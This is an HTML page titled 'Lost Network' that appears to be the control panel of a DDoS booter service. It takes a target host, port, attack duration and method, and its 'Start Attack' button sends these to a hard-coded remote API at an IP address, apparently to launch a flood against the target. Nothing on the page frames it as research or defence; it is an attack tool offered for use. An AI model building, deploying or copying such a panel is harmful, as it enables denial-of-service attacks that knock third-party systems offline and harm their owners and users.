<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lost Network</title>
    <style>
        body {
            background: url('https://source.unsplash.com/1600x900/?dark,red') no-repeat center center fixed;
            background-size: cover;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            margin-top: 50px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.7);
            display: inline-block;
            border-radius: 10px;
        }
        input, button {
            display: block;
            width: 90%;
            margin: 10px auto;
            padding: 10px;
            border: none;
            border-radius: 5px;
        }
        button {
            background: red;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Lost Network</h1>
        <label>Host:</label>
        <input type="text" id="host" placeholder="Enter Host">
        <label>Port:</label>
        <input type="number" id="port" placeholder="Enter Port">
        <label>Time:</label>
        <input type="number" id="time" placeholder="Enter Time">
        <label>Method:</label>
        <input type="text" id="methods" placeholder="Enter Method">
        <button onclick="startAttack()">Start Attack</button>
        <p id="status"></p>
    </div>
    <script>
        function startAttack() {
            const host = document.getElementById('host').value;
            const port = document.getElementById('port').value;
            const time = document.getElementById('time').value;
            const methods = document.getElementById('methods').value;if (!host || !port || !time || !methods) {
            document.getElementById('status').innerText = 'Please fill all fields!';
            return;
        }
        
        fetch(`http://170.64.212.98:2047/api?host=${host}&port=${port}&time=${time}&methods=${methods}`)
            .then(response => response.json())
            .then(data => {
                document.getElementById('status').innerText = data.status || data.error;
            })
            .catch(err => {
                document.getElementById('status').innerText = 'Error connecting to API!';
                console.error('Fetch error:', err);
            });
    }
</script>

</body>
</html>
